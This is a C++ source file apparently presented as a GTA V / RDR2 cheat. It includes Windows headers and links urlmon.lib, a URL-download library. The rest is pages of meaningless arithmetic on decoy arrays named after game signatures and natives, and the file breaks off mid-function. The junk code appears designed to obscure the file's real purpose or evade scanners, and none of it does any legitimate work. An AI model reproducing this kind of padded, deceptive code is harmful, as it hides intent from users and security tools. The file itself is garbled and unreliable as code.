#include<iostream>
#include<stdio.h>
#include<fstream>
#include<string>
#include <vector>
#include <windows.h>  
#include <chrono>   
#include <sstream>  
#include <filesystem>
#pragma comment(lib, "urlmon.lib")
#include <direct.h>
#include <cstdlib>
using namespace std;
//GTA e RDR2
//#include "natives.h"


int PED_TO_NET_ = 2;
int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
int offset = (PED_TO_NET_ * 0xA) + 0xBB;
int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
float a = 0.0f;
float b = 0.0f;
int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

int ponteiro = 2;
int aaaaaa = ponteiro * 2;
int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

namespace Extern_Reader
{
	namespace LOG
	{
		std::string arquivoTXT;
		int PED_TO_NET_ = 2;
		int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		int offset = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		float a = 0.0f;
		float b = 0.0f;
		int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
		int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

		int ponteiro = 2;
		int aaaaaa = ponteiro * 2;
		int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
		int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
		std::string HoraAtual()
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
